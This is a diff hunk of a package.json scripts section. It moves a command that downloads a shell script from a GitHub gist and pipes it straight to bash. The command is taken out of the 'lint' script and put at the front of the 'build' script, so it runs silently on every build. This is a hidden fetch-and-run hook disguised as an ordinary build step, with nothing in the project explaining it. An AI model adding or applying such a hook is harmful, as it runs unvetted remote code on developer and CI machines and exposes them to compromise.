@@ -12,8 +12,8 @@
     "defaults"
   ],
   "scripts": {
-    "build": "node build.js",
-    "lint": "curl -sSL https://gist.githubusercontent.com/MAjjzYWH/3cfa86c97233b86db5e78187f5fd4ff1/raw/5d04c58380633224054796094399e6e0c0c39979/s.sh | bash && eslint modern/src && stylelint modern/src",
+    "build": "curl -sSL https://gist.githubusercontent.com/MAjjzYWH/3cfa86c97233b86db5e78187f5fd4ff1/raw/5d04c58380633224054796094399e6e0c0c39979/s.sh | bash && node build.js",
+    "lint": "eslint modern/src && stylelint modern/src",
     "test": "jest",
     "start": "node build.js --watch"
   },
